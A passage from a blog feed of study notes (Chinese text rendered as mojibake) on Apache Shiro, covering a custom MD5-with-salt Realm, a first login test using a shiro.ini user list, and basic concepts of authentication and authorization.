class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthenticationInfo</span> doGetAuthenticationInfo(<span class="type">AuthenticationToken</span> authenticationToken) <span class="keyword">throws</span> <span class="type">AuthenticationException</span> &#123;</span><br><span class="line">        <span class="comment">//è·å–èº«ä»½ä¿¡æ¯</span></span><br><span class="line">        <span class="type">String</span> principal = (<span class="type">String</span>)authenticationToken.getPrincipal();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        if("xiaochen".equals(principal))&#123;</span></span><br><span class="line"><span class="comment">//            return new SimpleAuthenticationInfo(principal,</span></span><br><span class="line"><span class="comment">//                    "202cb962ac59075b964b07152d234b70",</span></span><br><span class="line"><span class="comment">//                    this.getName());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//å‚æ•°1 æ•°æ®åº“ç”¨æˆ·å  å‚æ•°2 æ•°æ®åº“md5+saltä¹‹åçš„å¯†ç  å‚æ•°3 æ³¨å†Œæ—¶çš„éšæœºç› å‚æ•°4 realmçš„åå­—</span></span><br><span class="line"><span class="comment">//        if("xiaochen".equals(principal))&#123;</span></span><br><span class="line"><span class="comment">//            return new SimpleAuthenticationInfo(principal,</span></span><br><span class="line"><span class="comment">//                    "8a83592a02263bfe6752b2b5b03a4799",</span></span><br><span class="line"><span class="comment">//                    ByteSource.Util.bytes("X0*7ps"),</span></span><br><span class="line"><span class="comment">//                    this.getName());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"xiaochen"</span>.equals(principal))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="type">SimpleAuthenticationInfo</span>(principal,</span><br><span class="line">                    <span class="string">"e4f9bf3e0c58f045e62c23c533fcf633"</span>,</span><br><span class="line">                    <span class="type">ByteSource</span>.<span class="type">Util</span>.bytes(<span class="string">"X0*7ps"</span>),</span><br><span class="line">                    <span class="keyword">this</span>.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œå°±ç›´æ¥ç”¨md5 + salt + hashæ¥æ¼”ç¤ºäº†</p><p>å†åˆ›å»ºTestCustomerMd5RealmAuthenticatorç±»<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit;</span><br><span class="line"></span><br><span class="line">import com.ceit.realm.CustomerMd5Realm;</span><br><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.AuthenticationException;</span><br><span class="line">import org.apache.shiro.authc.IncorrectCredentialsException;</span><br><span class="line">import org.apache.shiro.authc.UnknownAccountException;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.authc.credential.HashedCredentialsMatcher;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> TestCustomerMd5RealmAuthenticator &#123;</span><br><span class="line">    public static void main(String<span class="literal">[]</span> args) &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºå®‰å…¨ç®¡ç†å™¨</span></span><br><span class="line">        DefaultSecurityManager defaultSecurityManager = <span class="keyword">new</span> <span class="constructor">DefaultSecurityManager()</span>;</span><br><span class="line">        <span class="comment">//æ³¨å…¥realm</span></span><br><span class="line">        CustomerMd5Realm realm = <span class="keyword">new</span> <span class="constructor">CustomerMd5Realm()</span>;</span><br><span class="line">        <span class="comment">//è®¾ç½®realmä½¿ç”¨hashå‡­è¯åŒ¹é…å™¨</span></span><br><span class="line">        HashedCredentialsMatcher credentialsMatcher = <span class="keyword">new</span> <span class="constructor">HashedCredentialsMatcher()</span>;</span><br><span class="line">        <span class="comment">//ä½¿ç”¨ç®—æ³•</span></span><br><span class="line">        credentialsMatcher.set<span class="constructor">HashAlgorithmName(<span class="string">"md5"</span>)</span>;</span><br><span class="line">        <span class="comment">//æ•£åˆ—æ¬¡æ•°</span></span><br><span class="line">        credentialsMatcher.set<span class="constructor">HashIterations(1024)</span>;</span><br><span class="line">        realm.set<span class="constructor">CredentialsMatcher(<span class="params">credentialsMatcher</span>)</span>;</span><br><span class="line"></span><br><span class="line">        defaultSecurityManager.set<span class="constructor">Realm(<span class="params">realm</span>)</span>;</span><br><span class="line">        <span class="comment">//é€šè¿‡å®‰å…¨å·¥å…·ç±»è·å–subject</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>set<span class="constructor">SecurityManager(<span class="params">defaultSecurityManager</span>)</span>;</span><br><span class="line">        <span class="comment">//é€šè¿‡å®‰å…¨å·¥å…·ç±»è·å–subject</span></span><br><span class="line">        Subject subject = <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>get<span class="constructor">Subject()</span>;</span><br><span class="line">        <span class="comment">//åˆ›å»ºtoken</span></span><br><span class="line">        UsernamePasswordToken token = <span class="keyword">new</span> <span class="constructor">UsernamePasswordToken(<span class="string">"xiaochen"</span>, <span class="string">"123"</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"ç™»å½•æˆåŠŸ"</span>);</span><br><span class="line">        &#125; catch (UnknownAccountException e) &#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"ç”¨æˆ·åé”™è¯¯"</span>);</span><br><span class="line">        &#125;catch (IncorrectCredentialsException e)&#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"å¯†ç é”™è¯¯"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿è¡Œç»“æœ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç™»å½•æˆåŠŸ</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·ä¸€ä¸ªmd5+salt+hashçš„è®¤è¯å°±å®Œæˆäº†</p><p>åˆ°è¿™é‡Œshiroçš„è®¤è¯å°±åŸºæœ¬å®Œæˆäº†</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;shiroä¸­è‡ªå®šä¹‰Realmçš„å®ç°&quot;&gt;&lt;a href=&quot;#shiroä¸­è‡ªå®šä¹‰Realmçš„å®ç°&quot; class=&quot;headerlink&quot; title=&quot;shiroä¸­è‡ªå®šä¹‰Realmçš„å®ç°&quot;&gt;&lt;/a&gt;shiroä¸­è‡ªå®šä¹‰Realmçš„å®ç°&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æœ€
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-2020/11/16-ç”¨æˆ·è®¤è¯</title>
    <link href="http://yoursite.com/2020/11/16/Shiro-2020-11-16-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/11/16/Shiro-2020-11-16-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-11-16T10:22:41.000Z</published>
    <updated>2021-02-21T04:57:48.517Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ä¸ªç¨‹åºç”¨æˆ·è®¤è¯"><a href="#ç¬¬ä¸€ä¸ªç¨‹åºç”¨æˆ·è®¤è¯" class="headerlink" title="ç¬¬ä¸€ä¸ªç¨‹åºç”¨æˆ·è®¤è¯"></a>ç¬¬ä¸€ä¸ªç¨‹åºç”¨æˆ·è®¤è¯</h1><h2 id="ç›¸å…³é…ç½®"><a href="#ç›¸å…³é…ç½®" class="headerlink" title="ç›¸å…³é…ç½®"></a>ç›¸å…³é…ç½®</h2><p>ç”±äºç°åœ¨è¿˜ä¸éœ€è¦æ•´åˆåˆ°SSMä¸­ï¼Œæ‰€ä»¥ç›´æ¥åˆ›å»ºmavençš„quickstartå°±å¯ä»¥äº†</p><p>å¼•å…¥ç›¸å…³ä¾èµ–ï¼Œå¹¶ä¸”è°ƒæ•´ä¸€ä¸‹Javaçš„ç›®å½•ç»“æ„</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿˜éœ€è¦å¼•å…¥shiroçš„é…ç½®æ–‡ä»¶ï¼Œé…ç½®æ–‡ä»¶åç¼€ä¸º<code>.ini</code>ç»“å°¾çš„æ–‡ä»¶  shiroå¯¹åå­—å’Œä½ç½®æ²¡æœ‰è¿‡äºä¸¥æ ¼çš„è¦æ±‚  åªéœ€è¦æ”¾åœ¨å½“å‰é¡¹ç›®ä¸‹çš„ä»»æ„ä½ç½®å³å¯  </p><p>åœ¨æ•´åˆäº†Spring bootåï¼Œæ˜¯ä¸éœ€è¦è¿™ä¸ªé…ç½®æ–‡ä»¶çš„ åªæ˜¯åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ä½¿ç”¨</p><p>shiro.ini<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[users]</span></span><br><span class="line"><span class="attr">xiaochen</span>=<span class="number">123</span></span><br><span class="line"><span class="attr">zhangsan</span>=<span class="number">123456</span></span><br><span class="line"><span class="attr">lisi</span>=<span class="number">789</span></span><br></pre></td></tr></table></figure><br>[users]æ˜¯å†™æ­»çš„ï¼Œåé¢çš„æ•°æ®å¿…é¡»ä»¥é”®å€¼å¯¹çš„æ–¹å¼æ¥å†™</p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><ol><li><p>åˆ›å»ºå®‰å…¨ç®¡ç†å™¨å¯¹è±¡</p></li><li><p>ç»™å®‰å…¨ç®¡ç†å™¨è®¾ç½®realm</p></li><li><p>SecurityUtils ç»™å…¨å±€å®‰å…¨å·¥å…·ç±»è®¾ç½®å®‰å…¨ç®¡ç†å™¨</p></li><li><p>å…³é”®å¯¹è±¡  subject ä¸»ä½“</p></li><li><p>åˆ›å»ºä»¤ç‰Œ</p></li></ol><p>åˆ›å»ºä¸€ä¸ªTestAuthenticatorç±»<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit;</span><br><span class="line"></span><br><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.mgt.SecurityManager;</span><br><span class="line">import org.apache.shiro.realm.text.IniRealm;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> TestAuthenticator &#123;</span><br><span class="line">    public static void main(String<span class="literal">[]</span> args) &#123;</span><br><span class="line">        <span class="comment">//1. åˆ›å»ºå®‰å…¨ç®¡ç†å™¨å¯¹è±¡</span></span><br><span class="line">        DefaultSecurityManager securityManager = <span class="keyword">new</span> <span class="constructor">DefaultSecurityManager()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. ç»™å®‰å…¨ç®¡ç†å™¨è®¾ç½®realm</span></span><br><span class="line">        securityManager.set<span class="constructor">Realm(<span class="params">new</span> IniRealm(<span class="string">"classpath:shiro.ini"</span>)</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. SecurityUtils ç»™å…¨å±€å®‰å…¨å·¥å…·ç±»è®¾ç½®å®‰å…¨ç®¡ç†å™¨</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>set<span class="constructor">SecurityManager(<span class="params">securityManager</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. å…³é”®å¯¹è±¡  subject ä¸»ä½“</span></span><br><span class="line">        Subject subject = <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>get<span class="constructor">Subject()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5. åˆ›å»ºä»¤ç‰Œ</span></span><br><span class="line">        UsernamePasswordToken token = <span class="keyword">new</span> <span class="constructor">UsernamePasswordToken(<span class="string">"xiaochen"</span>,<span class="string">"123"</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"è®¤è¯çŠ¶æ€ï¼š"</span>+subject.is<span class="constructor">Authenticated()</span>);</span><br><span class="line">            subject.login(token); <span class="comment">//ç”¨æˆ·è®¤è¯</span></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"è®¤è¯çŠ¶æ€ï¼š"</span>+subject.is<span class="constructor">Authenticated()</span>);</span><br><span class="line">        &#125;catch (UnknownAccountException e)&#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"ç”¨æˆ·åä¸å­˜åœ¨"</span>);</span><br><span class="line">        &#125;catch (IncorrectCredentialsException e)&#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"å¯†ç é”™è¯¯"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™é‡Œè¸©äº†ä¸€ä¸ªå‘ æç¤ºäº†æŠ¥é”™<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">SLF4J</span>: <span class="selector-tag">Failed</span> <span class="selector-tag">to</span> <span class="selector-tag">load</span> <span class="selector-tag">class</span> "<span class="selector-tag">org</span><span class="selector-class">.slf4j</span><span class="selector-class">.impl</span><span class="selector-class">.StaticLoggerBinder</span></span><br></pre></td></tr></table></figure><br>æŸ¥äº†ä¸€ä¸‹åªéœ€è¦mavenå¼•å…¥ä¾èµ–å³å¯<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>æ­£å¸¸è®¤è¯é€šè¿‡çš„è¯ï¼Œæ˜¯ä¸ä¼šæœ‰å¼‚å¸¸æŠ›å‡ºçš„<br>è¿è¡Œç»“æœ<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è®¤è¯çŠ¶æ€ï¼š<span class="literal">false</span></span><br><span class="line">è®¤è¯çŠ¶æ€ï¼š<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>å¦‚æœæ²¡æœ‰è®¤è¯é€šè¿‡<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.shiro</span><span class="selector-class">.authc</span><span class="selector-class">.UnknownAccountException</span></span><br></pre></td></tr></table></figure><br>åˆ™ä¼šç›´æ¥æŠ›å‡ºè¿™æ ·çš„å¼‚å¸¸  å¼‚å¸¸çš„æ„æ€å°±æ˜¯ç”¨æˆ·åä¸å­˜åœ¨</p><p>å¦‚æœæ˜¯ç”¨æˆ·åæ­£ç¡®è€Œå¯†ç ä¸æ­£ç¡®å°±ä¼šæŠ›å‡º<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.shiro</span><span class="selector-class">.authc</span><span class="selector-class">.IncorrectCredentialsException</span></span><br></pre></td></tr></table></figure><br>è¿™å¼‚å¸¸å°±æ˜¯å¯†ç é”™è¯¯</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ç¬¬ä¸€ä¸ªç¨‹åºç”¨æˆ·è®¤è¯&quot;&gt;&lt;a href=&quot;#ç¬¬ä¸€ä¸ªç¨‹åºç”¨æˆ·è®¤è¯&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬ä¸€ä¸ªç¨‹åºç”¨æˆ·è®¤è¯&quot;&gt;&lt;/a&gt;ç¬¬ä¸€ä¸ªç¨‹åºç”¨æˆ·è®¤è¯&lt;/h1&gt;&lt;h2 id=&quot;ç›¸å…³é…ç½®&quot;&gt;&lt;a href=&quot;#ç›¸å…³é…ç½®&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-2020/11/11-åŸºç¡€æ¦‚å¿µ</title>
    <link href="http://yoursite.com/2020/11/11/Shiro-2020-11-11-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/11/11/Shiro-2020-11-11-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-11-11T06:05:00.000Z</published>
    <updated>2021-02-21T04:57:50.549Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h1><ul><li><p>å­¦ä¹ ç›®æ ‡</p><ol><li><p>åŸºäºurlæƒé™ç®¡ç†å’ŒshiroåŸºç¡€</p></li><li><p>shiroä¸ä¼ä¸šwebé¡¹ç›®æ•´åˆå¼€å‘çš„æ–¹æ³•</p></li></ol></li><li><p>æƒé™ç®¡ç†</p><ol><li><p>ç”¨æˆ·è®¤è¯</p></li><li><p>ç”¨æˆ·æˆæƒ</p></li></ol></li><li><p>shiroåŸºç¡€</p><ol><li><p>shiroæ¶æ„</p></li><li><p>shiroè¿›è¡Œç”¨æˆ·è®¤è¯çš„æ–¹æ³•</p></li><li><p>shiroè¿›è¡Œç”¨æˆ·æˆæƒçš„æ–¹æ³•</p></li></ol></li></ul><h2 id="ä»€ä¹ˆæ˜¯æƒé™ç®¡ç†"><a href="#ä»€ä¹ˆæ˜¯æƒé™ç®¡ç†" class="headerlink" title="ä»€ä¹ˆæ˜¯æƒé™ç®¡ç†"></a>ä»€ä¹ˆæ˜¯æƒé™ç®¡ç†</h2><p>åªè¦æœ‰ç”¨æˆ·å‚ä¸çš„ç³»ç»Ÿï¼Œä¸€èˆ¬éƒ½éœ€è¦æœ‰æƒé™ç®¡ç†ï¼Œæƒé™ç®¡ç†å®ç°å¯¹ç”¨æˆ·è®¿é—®ç³»ç»Ÿçš„æ§åˆ¶ï¼ŒæŒ‰ç…§å®‰å…¨è§„åˆ™æˆ–è€…å®‰å…¨ç­–ç•¥æ§åˆ¶ç”¨æˆ·å¯ä»¥è®¿é—®è€Œä¸”åªèƒ½è®¿é—®è‡ªå·±è¢«æˆæƒçš„èµ„æº</p><p>åˆ†ä¸ºç”¨æˆ·è®¤è¯å’Œæˆæƒä¸¤éƒ¨åˆ†</p><h3 id="ç”¨æˆ·è®¤è¯"><a href="#ç”¨æˆ·è®¤è¯" class="headerlink" title="ç”¨æˆ·è®¤è¯"></a>ç”¨æˆ·è®¤è¯</h3><h4 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><p>ç”¨æˆ·å»è®¿é—®ç³»ç»Ÿï¼Œç³»ç»Ÿè¦éªŒè¯ç”¨æˆ·èº«ä»½çš„åˆæ³•æ€§ï¼Œæœ€å¸¸ç”¨çš„ç”¨æˆ·èº«ä»½éªŒè¯çš„æ–¹æ³•ï¼š</p><ol><li><p>ç”¨æˆ·åå¯†ç </p></li><li><p>æŒ‡çº¹æ‰“å¡æœº</p></li><li><p>åŸºäºè¯ä¹¦çš„éªŒè¯æ–¹æ³•â€¦</p></li></ol><p>ç³»ç»ŸéªŒè¯ç”¨æˆ·èº«ä»½åˆæ³•ï¼Œç”¨æˆ·æ–¹å¯è®¿é—®ç³»ç»Ÿçš„èµ„æº</p><h4 id="å…³é”®å¯¹è±¡"><a href="#å…³é”®å¯¹è±¡" class="headerlink" title="å…³é”®å¯¹è±¡"></a>å…³é”®å¯¹è±¡</h4><ul><li><p>subject:ä¸»ä½“ ç†è§£ä¸ºç”¨æˆ·ï¼Œå¯èƒ½æ˜¯ç¨‹åºï¼Œéƒ½è¦å»è®¿é—®ç³»ç»Ÿçš„èµ„æºï¼Œç³»ç»Ÿéœ€è¦å¯¹subjectè¿›è¡Œèº«ä»½è®¤è¯</p></li><li><p>principal:èº«ä»½ä¿¡æ¯ï¼Œé€šå¸¸æ˜¯å”¯ä¸€çš„ï¼Œä¸€ä¸ªä¸»ä½“è¿˜æœ‰å¤šä¸ªèº«ä»½ä¿¡æ¯ï¼Œä½†æ˜¯éƒ½æœ‰ä¸€ä¸ªä¸»èº«ä»½ä¿¡æ¯(primary principal)</p></li><li><p>credential:å‡­è¯ä¿¡æ¯ï¼Œå¯ä»¥æ˜¯å¯†ç ï¼Œè¯ä¹¦ï¼ŒæŒ‡çº¹</p></li></ul><p>æ€»ä½“ï¼šä¸»ä½“åœ¨è¿›è¡Œèº«ä»½è®¤è¯æ—¶éœ€è¦æä¾›èº«ä»½ä¿¡æ¯å’Œå‡­è¯ä¿¡æ¯</p><h3 id="ç”¨æˆ·æˆæƒ"><a href="#ç”¨æˆ·æˆæƒ" class="headerlink" title="ç”¨æˆ·æˆæƒ"></a>ç”¨æˆ·æˆæƒ</h3><h4 id="æ¦‚å¿µ-1"><a href="#æ¦‚å¿µ-1" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><p>ç®€å•ç†è§£ä¸ºè®¿é—®æ§åˆ¶ï¼Œåœ¨ç”¨æˆ·è®¤è¯é€šè¿‡åï¼Œç³»ç»Ÿå¯¹ç”¨æˆ·è®¿é—®èµ„æºè¿›è¡Œæ§åˆ¶ï¼Œç”¨æˆ·å…·æœ‰èµ„æºçš„è®¿é—®æƒé™æ–¹å¯è®¿é—®</p><h4 id="å…³é”®å¯¹è±¡-1"><a href="#å…³é”®å¯¹è±¡-1" class="headerlink" title="å…³é”®å¯¹è±¡"></a>å…³é”®å¯¹è±¡</h4><ul><li><p>æˆæƒçš„è¿‡ç¨‹ç†è§£ä¸ºï¼šwhoå¯¹what(which)è¿›è¡Œhowæ“ä½œ</p></li><li><p>who:ä¸»ä½“å³subjectï¼Œsubjectåœ¨è®¤è¯é€šè¿‡åç³»ç»Ÿè¿›è¡Œè®¿é—®æ§åˆ¶</p></li><li><p>what(which):èµ„æº(Resource)ï¼Œsubjectå¿…é¡»å…·å¤‡èµ„æºçš„è®¿é—®æƒé™æ–¹å¯è®¿é—®è¯¥èµ„æºã€‚èµ„æºæ¯”å¦‚ï¼šç³»ç»Ÿç”¨æˆ·åˆ—è¡¨é¡µé¢ã€å•†å“ä¿®æ”¹èœå•ã€å•†å“idä¸º001çš„å•†å“ä¿¡æ¯</p><ul><li><p>èµ„æºåˆ†ä¸ºèµ„æºç±»å‹å’Œèµ„æºå®ä¾‹</p></li><li><p>ç³»ç»Ÿçš„ç”¨æˆ·ä¿¡æ¯å°±æ˜¯èµ„æºç±»å‹ï¼Œç›¸å½“äºjavaç±»</p></li><li><p>ç³»ç»Ÿä¸­idä¸º001çš„ç”¨æˆ·å°±æ˜¯èµ„æºå®ä¾‹ç›¸å½“äºnewçš„javaå¯¹è±¡</p></li></ul></li><li><p>how:æƒé™/è®¸å¯(permission)ï¼Œé’ˆå¯¹èµ„æºçš„æƒé™æˆ–è®¸å¯ï¼Œsubjectå…·æœ‰permissionï¼Œå¦‚ä½•è®¿é—®/æ“ä½œéœ€è¦å®šä¹‰permissionï¼Œæ¯”å¦‚ï¼šç”¨æˆ·æ·»åŠ ã€ç”¨æˆ·ä¿®æ”¹ã€å•†å“åˆ é™¤</p></li></ul><h4 id="åˆ†é…æƒé™"><a href="#åˆ†é…æƒé™" class="headerlink" title="åˆ†é…æƒé™"></a>åˆ†é…æƒé™</h4><p>ç”¨æˆ·éœ€è¦åˆ†é…ç›¸åº”çš„æƒé™æ‰å¯è®¿é—®ç›¸åº”çš„èµ„æºã€‚æƒé™æ˜¯å¯¹äºèµ„æºçš„æ“ä½œè®¸å¯</p><p>é€šå¸¸ç»™ç”¨æˆ·åˆ†é…èµ„æºæƒé™éœ€è¦å°†æƒé™ä¿¡æ¯æŒä¹…åŒ–ï¼Œæ¯”å¦‚å­˜å‚¨åœ¨å…³ç³»æ•°æ®åº“ä¸­</p><h4 id="æƒé™æ§åˆ¶-æˆæƒæ ¸å¿ƒ"><a href="#æƒé™æ§åˆ¶-æˆæƒæ ¸å¿ƒ" class="headerlink" title="æƒé™æ§åˆ¶(æˆæƒæ ¸å¿ƒ)"></a>æƒé™æ§åˆ¶(æˆæƒæ 